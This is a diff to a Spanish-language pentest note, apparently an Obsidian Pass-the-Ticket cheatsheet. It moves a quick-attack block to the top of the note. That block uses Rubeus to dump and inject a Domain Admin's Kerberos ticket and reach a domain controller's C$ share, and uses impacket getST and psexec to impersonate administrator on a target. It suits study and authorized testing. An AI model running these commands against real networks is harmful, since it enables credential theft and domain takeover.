@@ -38,7 +38,30 @@ linked:
 
 ## Cheatsheet
 
-### 🎫 Formatos y Conversión
+### 1. Ataque Rápido (TL;DR)
+
+```powershell
+# Windows — dump TGT de DA que logueó
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:<LUID_del_DA> /service:krbtgt /nowrap
+.\Rubeus.exe purge
+.\Rubeus.exe ptt /ticket:<BASE64>
+klist
+dir \\dc01.corp.local\c$
+```
+
+```bash
+# Linux — getST + uso con impacket
+impacket-getST -spn cifs/target.corp.local -impersonate administrator corp.local/svc:'P@ss'
+export KRB5CCNAME=administrator@cifs_target.corp.local.ccache
+impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
+```
+
+---
+
+### 2. Explotación
+
+#### 🎫 Formatos y Conversión
 
 ````tabs
 tab: **.kirbi (Windows)**
@@ -60,7 +83,7 @@ tab: **Purge**
 ![[Pass-the-Ticket - Formatos y Conversión#^ptt-fmt-purge]]
 ````
 
-### 🪟 Windows Extraction
+#### 🪟 Windows Extraction
 
 ````tabs
 tab: **Rubeus dump**
@@ -82,7 +105,7 @@ tab: **LUID targeting**
 ![[Pass-the-Ticket - Windows Extraction#^ptt-win-luid]]
 ````
 
-### 🐧 Linux Extraction
+#### 🐧 Linux Extraction
 
 ````tabs
 tab: **ccache Locations**
@@ -104,7 +127,7 @@ tab: **SSSD / realmd**
 ![[Pass-the-Ticket - Linux Extraction#^ptt-linux-sssd]]
 ````
 
-### 💉 Inyección y Uso
+#### 💉 Inyección y Uso
 
 ````tabs
 tab: **Rubeus ptt**
@@ -126,7 +149,7 @@ tab: **Requirements**
 ![[Pass-the-Ticket - Inyección y Uso#^ptt-inject-req]]
 ````
 
-### 🛡️ Detection & Mitigations
+#### 🛡️ Detection & Mitigations
 
 ````tabs
 tab: **Detection Events**
@@ -148,7 +171,7 @@ tab: **Hardening Checklist**
 ![[Pass-the-Ticket - Detection y Mitigations#^ptt-detect-checklist]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **Rubeus**
@@ -222,27 +245,6 @@ tab: **Recursos**
    - Linux: impacket-psexec/wmiexec/secretsdump -k -no-pass
 
 6. Cleanup: Rubeus.exe purge / klist purge / kdestroy
-```
-
----
-
-## Detección rápida
-
-```powershell
-# Windows — dump TGT de DA que logueó
-.\Rubeus.exe triage
-.\Rubeus.exe dump /luid:<LUID_del_DA> /service:krbtgt /nowrap
-.\Rubeus.exe purge
-.\Rubeus.exe ptt /ticket:<BASE64>
-klist
-dir \\dc01.corp.local\c$
-```
-
-```bash
-# Linux — getST + uso con impacket
-impacket-getST -spn cifs/target.corp.local -impersonate administrator corp.local/svc:'P@ss'
-export KRB5CCNAME=administrator@cifs_target.corp.local.ccache
-impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
 ```
 
 ---
